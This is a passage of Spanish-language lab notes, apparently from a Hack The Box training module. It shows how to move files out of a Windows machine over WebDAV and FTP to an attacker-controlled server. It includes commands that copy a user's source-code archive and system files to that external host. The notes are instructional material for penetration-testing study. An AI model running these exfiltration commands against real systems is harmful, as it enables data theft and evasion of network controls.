Anteriormente comentamos que las empresas suelen permitir el tráfico saliente utilizando `HTTP` (TCP/80) y `HTTPS`(TCP/443) protocolos. Normalmente, las empresas no permiten que el protocolo SMB (TCP/445) salga de su red interna porque esto puede exponerlas a posibles ataques. Para más información al respecto podemos leer el post de Microsoft [Prevención del tráfico SMB desde conexiones laterales y entrada o salida de la red](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a) . Una alternativa es ejecutar SMB a través de HTTP con `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) es una extensión de HTTP, el protocolo de Internet que los navegadores y servidores web utilizan para comunicarse entre sí. El `WebDAV` El protocolo permite que un servidor web se comporte como un servidor de archivos, lo que admite la creación colaborativa de contenido. `WebDAV` También puede utilizar HTTPS.

#### Configuración del servidor WebDav
Para configurar nuestro servidor WebDav, necesitamos instalar dos módulos de Python, `wsgidav` y `cheroot`(Puedes leer más sobre esta implementación aquí: [wsgidav github](https://github.com/mar10/wsgidav) ).

#### Instalación de módulos WebDav Python
```js
p314d0@htb[/htb]$ sudo pip3 install wsgidav cheroot
```

#### Usando el módulo WebDav Python
```js
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
Running without configuration file.
16:10:06.373 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
16:10:06.374 - INFO    : WsgiDAV/4.3.3 Python/3.11.9 Linux-6.8.11-amd64-x86_64-with-glibc2.38
16:10:06.374 - INFO    : Lock manager:      LockManager(LockStorageDict)
16:10:06.374 - INFO    : Property manager:  None
16:10:06.374 - INFO    : Domain controller: SimpleDomainController()
16:10:06.374 - INFO    : Registered DAV providers by route:
16:10:06.374 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.11/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
16:10:06.374 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
16:10:06.374 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
16:10:06.374 - WARNING : Share '/' will allow anonymous write access.
16:10:06.374 - WARNING : Share '/:dir_browser' will allow anonymous write access.
16:10:06.374 - WARNING : Could not import lxml: using xml instead (up to 10% slower). Consider `pip install lxml`(see https://pypi.python.org/pypi/lxml).
16:10:06.386 - INFO    : Running WsgiDAV/4.3.3 Cheroot/10.0.1 Python/3.11.9
16:10:06.386 - INFO    : Serving on http://0.0.0.0:80 ...
```

#### Conexión a Webdav Share
```cmd
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

> [!NOTE]
> **Nota:** `DavWWWRoot`es una palabra clave especial reconocida por el Shell de Windows. No existe dicha carpeta en su servidor WebDAV. La palabra clave DavWWWRoot le indica al controlador Mini-Redirector, que maneja las solicitudes WebDAV, que se está conectando a la raíz del servidor WebDAV.
> Puede evitar el uso de esta palabra clave si especifica una carpeta que existe en su servidor cuando se conecta al servidor. Por ejemplo: \192.168.49.128\carpeta compartida.

#### Subir archivos usando SMB
```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

> [!NOTE]
> **Nota:** Si no hay restricciones de SMB (TCP/445), puede usar impacket-smbserver de la misma manera que lo configuramos para las operaciones de descarga.

## FTP Uploads
Cargar archivos mediante FTP es muy similar a descargar archivos. Podemos utilizar PowerShell o el cliente FTP para completar la operación. Antes de iniciar nuestro servidor FTP usando el módulo Python `pyftpdlib`, necesitamos especificar la opción `--write` para permitir a los clientes cargar archivos a nuestro host de ataque.
```shell
p314d0@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
```

Ahora usemos la función de carga de PowerShell para cargar un archivo a nuestro servidor FTP.
```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

#### Cree un archivo de comando para que el cliente FTP cargue un archivo
```js
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

